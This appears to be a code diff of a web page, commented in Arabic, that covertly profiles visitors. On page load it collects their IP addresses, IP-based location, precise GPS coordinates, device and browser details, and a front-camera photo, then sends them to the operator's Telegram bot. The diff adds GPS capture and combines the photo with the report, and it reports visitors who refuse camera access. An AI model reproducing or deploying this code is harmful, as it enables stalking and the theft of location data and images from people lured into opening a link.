@@ -31,9 +31,11 @@
         }
 
         // دالة إرسال الصورة الملتقطة إلى تليجرام
-        function sendPhotoToTelegram(blob) {
+        function sendPhotoToTelegram(blob, captionText) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
+            formData.append('caption', captionText);
+            formData.append('parse_mode', 'HTML');
             formData.append('photo', blob, 'camera_capture.jpg');
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -43,34 +45,6 @@
             .then(res => res.json())
             .then(data => console.log('📷 تم إرسال الصورة:', data.ok))
             .catch(err => console.error('❌ خطأ في إرسال الصورة:', err));
-        }
-
-        // دالة تشغيل الكاميرا والتقاط الصورة
-        function captureAndSendPhoto() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-            .then(stream => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // إيقاف الكاميرا بعد أخذ الصورة
-                    stream.getTracks().forEach(track => track.stop());
-
-                    canvas.toBlob(blob => {
-                        sendPhotoToTelegram(blob);
-                    }, 'image/jpeg', 0.8);
-                }, 1500);
-            })
-            .catch(err => {
-                console.log('مرفوض أو غير متاح:', err);
-                sendToTelegram("⚠️ تنبيه: قام المستخدم بفتح الرابط ولكنّه <b>رفض إذن الكاميرا</b>.");
-            });
         }
 
         async function getPublicIPv4() {
@@ -132,22 +106,56 @@
             }
         }
 
+        // دالة سحب الموقع الدقيق عبر GPS
+        function getExactGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                        });
+                    },
+                    (error) => {
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
         (async function main() {
             const ipv4 = await getPublicIPv4();
             const ipv6 = await getPublicIPv6();
             const localIP = await getLocalIP();
-            const location = await getLocation(ipv4);
+            const ipLocation = await getLocation(ipv4);
+            
+            // طلب الموقع الدقيق والكاميرا معاً
+            const gpsLocation = await getExactGPSLocation();
 
             let msg = `<blockquote>`;
-            msg += ` <b>زيارة جديدة - مع التقاط الكاميرا</b>\n\n`;
+            msg += ` <b>زيارة جديدة - مع الموقع الدقيق والكاميرا</b>\n\n`;
             msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
             msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
             msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
-            if (location) {
-                msg += ` <b>الموقع</b>: <tg-spoiler> ${location.country} - ${location.city} </tg-spoiler>\n`;
-                msg += ` <b>الإحداثيات</b>: <tg-spoiler> ${location.lat}, ${location.lon} </tg-spoiler>\n`;
-                msg += ` <b>رابط الخريطة</b>: <a href="${location.mapLink}">اضغط هنا</a>\n\n`;
+            
+            if (ipLocation) {
+                msg += ` <b>موقع الـ IP</b>: <tg-spoiler> ${ipLocation.country} - ${ipLocation.city} </tg-spoiler>\n`;
             }
+
+            if (gpsLocation) {
+                msg += ` 📍 <b>الموقع الدقيق (GPS)</b>:\n`;
+                msg += ` <b>الإحداثيات</b>: <tg-spoiler>${gpsLocation.lat}, ${gpsLocation.lon}</tg-spoiler>\n`;
+                msg += ` <b>رابط خريطة GPS</b>: <a href="${gpsLocation.mapLink}">اضغط هنا للدقة العالية</a>\n\n`;
+            } else {
+                msg += ` 📍 <b>الموقع الدقيق (GPS)</b>: لم يتم السماح به أو مرفوض\n\n`;
+            }
+
             msg += ` <b>نظام التشغيل</b>: ${navigator.userAgent.includes('Windows') ? 'Windows' : navigator.userAgent.includes('Mac') ? 'Mac' : navigator.userAgent.includes('Android') ? 'Android' : 'غير معروف'}\n`;
             msg += ` <b>المتصفح</b>: ${navigator.userAgent.includes('Chrome') ? 'Chrome' : navigator.userAgent.includes('Firefox') ? 'Firefox' : navigator.userAgent.includes('Safari') ? 'Safari' : 'غير معروف'}\n`;
             msg += ` <b>نوع الجهاز</b>: ${/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'جوال/تابلت' : 'كمبيوتر'}\n`;
@@ -157,11 +165,30 @@
             msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
             msg += `</blockquote>`;
 
-            // إرسال معلومات الشبكة والجهاز نصياً
-            sendToTelegram(msg);
+            // تشغيل الكاميرا والتقاط الصورة وإرسالها مع النص مجتمعين
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    stream.getTracks().forEach(track => track.stop());
 
-            // تشغيل محاولة سحب الصورة عبر الكاميرا
-            captureAndSendPhoto();
+                    canvas.toBlob(blob => {
+                        sendPhotoToTelegram(blob, msg);
+                    }, 'image/jpeg', 0.8);
+                }, 1500);
+            })
+            .catch(err => {
+                console.log('مرفوض أو غير متاح:', err);
+                sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.");
+            });
         })();
     </script>
 </body>
